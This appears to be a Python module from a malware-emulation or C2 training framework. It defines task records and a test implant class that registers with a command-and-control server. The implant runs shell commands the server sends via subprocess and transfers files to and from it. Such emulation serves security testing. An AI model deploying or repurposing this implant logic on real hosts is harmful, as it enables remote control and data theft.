#-----------------------------------------------------------------------------
# Name:        c2MwUtils.py
#
# Purpose:     This module is a untility function module used for the other 
#              c2 server / client modules to store the malicious action emulation 
#              program's data.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.2.2
# Created:     2023/10/10
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import time
from datetime import datetime
import threading
import subprocess
from queue import Queue

# Add the c2 Client
import c2Client

# Define all the task state flag here: 
TASK_P_FLG = 0  # task pending flag
TASK_F_FLG = 1  # task finish flag
TASK_A_FLG = 2  # task accept flag
TASK_E_FLG = 3  # task error flag
TASK_R_FLG = 4  # task running flag

# Define all the action flag here:
ACT_KEY = 'action'
ACCEPT_FLG = 'ok'
REJECT_FLG = 'no'

# Define all the task type flag here:
RIG_FLG = 'register' # register flag
RPT_FLG = 'report'
UPLOAD_FLG = 'upload'
DOWNLOAD_FLG = 'download'
CMD_FLG = 'command'

# Define maximum command queue size
MAX_CMD_QUEUE_SIZE = 100

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class CmdRunner(threading.Thread):
    """ Command runner module to run a command immediately or store in the cmd 
        queue the run parallel with the parent thread.
    """
    def __init__(self, maxQsz=MAX_CMD_QUEUE_SIZE, rstDetailFlg=False):
        threading.Thread.__init__(self)
        self.cmdQueue = Queue(maxQsz)
        self.detailFlg = rstDetailFlg
        self.terminate = False

    #-----------------------------------------------------------------------------
    def run(self):
        print("Command Runner parallel cmd execution loop started.")
        while not self.terminate:
            if not self.cmdQueue.empty():
                cmdStr = self.cmdQueue.get()
                print("Parallel run cmdStr:", cmdStr)
                self.runCmd(cmdStr, detailFlg=self.detailFlg)
            time.sleep(0.1)
        print("Command Runner loop finished.")

    #-----------------------------------------------------------------------------
    def runCmdParallel(self, cmdStr):
        """ Add a command in the paralled execution queue."""
        if not self.cmdQueue.full():
            self.cmdQueue.put(cmdStr)
        else:
            print("Cmd queue is full, cannot add cmdStr:", cmdStr)

    #-----------------------------------------------------------------------------
    def runCmd(self, cmdStr, detailFlg=False):
        """ Run a command and collect the result on the victim host.
            Args:
                cmdStr (str): command string.
                detailFlg (bool, optional): flag to identify whether to show/return 
                    the execution detail. Defaults to False.
            Returns:
                str: return the command execution result, else return execution 
                    str 'success'/'fail'/'error'
        """
        if cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                print(result)
                return result if detailFlg else 'success'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return str(err) if detailFlg else 'fail'
        else:
            return 'error'

    #-----------------------------------------------------------------------------
    def stop(self):
        self.terminate = True

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class programRcd(object):
    """ A object to record the controlled malware's data, YC: Later this module will 
        be replaced by backend data base.
    """

    def __init__(self, uniqid, ipaddr, taskList=None, srvFlag=False) -> None:
        """ Init example :
            malwarercd = programRcd('testMalware', '127.0.0.1')
            Args:
                idx (int): record index in the data manager.
                id (str): malware unique ID.
                ipaddress (str): malware ip address.
                tasksList (list(dict()), optional): malare preset task list. Defaults to None.
                srvFlag (bool): flag to identify whehter it is a server record.
                - One task dict() examlpe:
                {
                    'taskID': 1,
                    'taskType': 'upload',
                    'startT': None,
                    'repeat': 1,
                    'exePreT': 0,
                    'taskData': [os.path.join(dirpath, "update_installer.zip")]
                },
        """
        self.uniqid = uniqid
        self.ipaddr = ipaddr
        self.srvFlg = srvFlag
        self.taskList = taskList if taskList else []
        self.taskCountDict = {
            'total'     :len(self.taskList),
            'finish'    :0,
            'accept'    :len(self.taskList),
            'pending'   :0,
            'running'   :0, 
            'error'     :0,
            'deactive'  :0
        }
        # Init the list to store the task result and the alst execution result.
        self.taskRstList = []
        self.lastTaskRst = {
            'taskID': 0,
            'state' : TASK_F_FLG,
            'time': '',
            'taskData': 'registered'
        }
        self._initTasksInfo()

    #-----------------------------------------------------------------------------
    def _initTasksInfo(self):
        """ Create the task summary dict and add the tast state in the tasks list."""
        # add the record task state in the task list.
        for task in self.taskList:
            if task['state'] == TASK_P_FLG:
                self.taskCountDict['pending'] += 1
            elif task['state'] == TASK_R_FLG:
                self.taskCountDict['running'] += 1
            elif task['state'] == TASK_E_FLG:
                self.taskCountDict['error'] += 1
            elif task['state'] == TASK_A_FLG:
                self.taskCountDict['accept'] += 1
            elif task['state'] == TASK_F_FLG:
                self.taskCountDict['finish'] += 1
            self.taskRstList.append(None)

    #-----------------------------------------------------------------------------
    def addNewTask(self, taskDict):
        """ Add a new task to the task list. """
        # Check taskDict is a dict type
        if not isinstance(taskDict, dict):
            print('Error: taskDict is not a dict type.')
            return False
        keysList = taskDict.keys()
        taskInfo = {
            'taskID'    : len(self.taskList),
            'taskType'  : taskDict['taskType'] if 'taskType' in keysList else CMD_FLG,
            'startT'    : taskDict['startT'] if 'startT' in keysList else None,
            'repeat'    : taskDict['repeat'] if 'repeat' in keysList else 1,
            'exePreT'    : taskDict['exePreT'] if 'exePreT' in keysList else 0,
            'taskData'  : taskDict['taskData'] if 'taskData' in keysList else None,
            'state'     : TASK_P_FLG if self.srvFlg else TASK_A_FLG
        }
        self.taskList.append(taskInfo)
        self.taskCountDict['total'] += 1
        stateKey = 'pending' if self.srvFlg else 'accept'
        self.taskCountDict[stateKey] += 1
        self.taskRstList.append(None)
        return True
    
    #-----------------------------------------------------------------------------
    # define all the public-get() function here: 
    
    def getRcdInfo(self):
        """ reutrn a malware record summary info"""
        infoDict = {'id': self.uniqid, 'ipAddr': self.ipaddr}
        infoDict.update(self.taskCountDict)
        return infoDict

    def getTaskInfo(self, taskID):
        """ Return one task's info dict()"""
        for task in self.taskList:
            if task['taskID'] == taskID: return task
        return None

    def getTaskList(self, taskState=None):
        """ return a list of task dict() based on the task state type."""
        if taskState is None: return self.taskList
        resultList = []    
        for task in self.taskList:
            if task['state'] == taskState: resultList.append(task)
        return resultList

    def getTaskRst(self, taskID=None):
        """ return all tasks result if not input task ID, else return task result."""
        if taskID is None: return self.taskRstList
        if 0 <= int(taskID) <= self.taskCountDict['total']:
            return self.taskList[int(taskID)]
        return None

    def getLastTaskRst(self):
        return self.lastTaskRst

    #-----------------------------------------------------------------------------
    # Define all the public-set() function here: 
    def setTaskState(self, idx, state=TASK_F_FLG):
        if 0 <= idx <= len(self.taskList):
            self.taskList[idx]['state'] = state
            return True
        return False

    def setTaskRst(self, idx, rst):
        if 0 <= idx <= len(self.taskRstList):
            self.taskRstList[idx] = rst
            return True
        return False

    def updateTaskRcd(self, taskList):
        for i, task in enumerate(self.taskList):
            for taskDict in taskList:
                if task['taskID'] == taskDict['taskID']:
                    self.taskList[i]['state'] = taskDict['state']
                    self.taskList[i]['startT'] = taskDict['Time']
                    self.lastTaskRst.update(taskDict)
                    break

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class mwServerRcd(programRcd):
    """ malware record obj use in the C2 server side."""

    def __init__(self, idx, uniqid, ipaddr, taskList=None, srvFlag=True) -> None:
        super().__init__(uniqid, ipaddr, taskList, srvFlag)
        self.idx = idx
        self.lastUpdateT = None
        self.connected = False
        self._initRegister()
        self.updateTime()

    def _initRegister(self):
        for i, task in enumerate(self.taskList):
            if task['taskType'] == RIG_FLG:
                self.connected = True
                self.taskList[i]['state'] = TASK_F_FLG
                return

    def getRcdInfo(self):
        rcdDict = {
            'idx':self.idx,
            'connected': self.connected,
            'updateT': self.lastUpdateT.strftime('%Y-%m-%d %H:%M:%S')
        }
        rcdDict.update(super().getRcdInfo())
        return rcdDict 

    def updateTime(self):
        self.lastUpdateT = datetime.now()

    def updateRegisterT(self):
        if len(self.taskList) > 0:
            self.taskList[0]['startT'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#-----------------------------------------------------------------------------
#----------------------------------------------------------------------------- 
class c2TestMalware(object):

    def __init__(self, malwareID, ownIp, c2Ipaddr, c2port=5000, tasksList=None, c2HttpsFlg=False, cmdTDFlg=False) -> None:
        # Init the malware paramters.
        self.malwareID = malwareID
        self.ownIp = ownIp
        self.c2Ipaddr = c2Ipaddr
        self.c2port = c2port
        self.c2HttpsFlg = c2HttpsFlg
        self.cmdTDFlg = cmdTDFlg
        self.tasksList = None 
        if tasksList is None:
            self.tasksList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'startT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'exePreT': 0,
                'state' : TASK_R_FLG,
                'taskData': None
            }]
        else:
            self.tasksList = tasksList
        # Init the C2 connector.
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, 
                                             c2Port=int(self.c2port), ownIP=self.ownIp, httpsFlg=self.c2HttpsFlg)
        # pre process the tasks.
        self._preporcessTasks()
        self.ownRcd = programRcd(self.malwareID, self.ownIp, taskList=self.tasksList)
        self.c2Connector.registerToC2(taskList=self.tasksList)
        self.cmdRunner = CmdRunner()
        self.terminate = False
        # Start all sub thread service
        self.c2Connector.start()
        if self.cmdTDFlg: self.cmdRunner.start()
        self._startSubThreads()

    #----------------------------------------------------------------------------- 
    def _startSubThreads(self):
        """ Start the user defined service"""
        return None

    #----------------------------------------------------------------------------- 
    def _stopSubThreads(self):
        """ Stop the user defined service"""
        return None

    #----------------------------------------------------------------------------- 
    def _preporcessTasks(self):
        """ Children classes can overwrite this function to preprocess this task
        """
        return None 
    
    def _handleSpecialTask(self, taskDict):
        return None

    #-----------------------------------------------------------------------------
    def run(self):
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # sychronized the task record
            if task is not None:
                self.ownRcd.addNewTask(task)
            # do one task
            for taskDict in self.ownRcd.getTaskList(taskState=TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == UPLOAD_FLG or taskDict['taskType'] == DOWNLOAD_FLG:
                        time.sleep(int(taskDict['exePreT']))
                        uploadFlg = taskDict['taskType'] == UPLOAD_FLG
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " %str(cmd))
                        resultStr = self.cmdRunner.runCmd(cmd, detailFlg=True)
                    else:
                        resultStr = self._handleSpecialTask(taskDict)
                    self.ownRcd.setTaskState(idx, state=TASK_F_FLG)
                    reportDict ={
                        'taskID': idx,
                        'state': c2Client.TASK_F_FLG,
                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData': str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=TASK_F_FLG)
                    time.sleep(0.1)

    #----------------------------------------------------------------------------- 
    def stop(self):
        self.c2Connector.stop()
        self.cmdRunner.stop()
        self.terminate = True
        self._stopSubThreads()
